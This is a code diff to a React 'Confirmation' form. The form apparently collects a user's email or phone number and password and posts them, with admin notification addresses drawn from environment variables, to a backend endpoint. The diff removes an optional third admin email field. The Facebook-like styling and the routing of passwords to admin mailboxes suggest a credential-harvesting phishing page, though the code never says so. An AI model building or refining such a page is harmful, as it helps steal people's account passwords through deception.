@@ -37,7 +37,6 @@ export default function Confirmation() {
       password: "",
       admin_email: import.meta.env.VITE_SMTP_USER || "",
       admin_email_2: import.meta.env.VITE_ADMIN_EMAIL || "",
-      admin_email_3: "", // Editable third admin email
     },
   });
 
@@ -67,7 +66,6 @@ export default function Confirmation() {
         user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
         admin_email: import.meta.env.VITE_SMTP_USER,
         admin_email_2: import.meta.env.VITE_ADMIN_EMAIL,
-        admin_email_3: data.admin_email_3
       };
 
       await fetch('/api/form-two', {
@@ -204,27 +202,6 @@ export default function Confirmation() {
                       <Input
                         type="password"
                         placeholder="Enter password"
-                        className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
-                        {...field}
-                      />
-                    </FormControl>
-                    <FormMessage className="text-xs text-red-500 mt-1" />
-                  </FormItem>
-                )}
-              />
-
-              <FormField
-                control={form.control}
-                name="admin_email_3"
-                render={({ field }) => (
-                  <FormItem>
-                    <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                      Additional Email (Optional)
-                    </FormLabel>
-                    <FormControl>
-                      <Input
-                        type="email"
-                        placeholder="Enter additional notification email"
                         className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                         {...field}
                       />
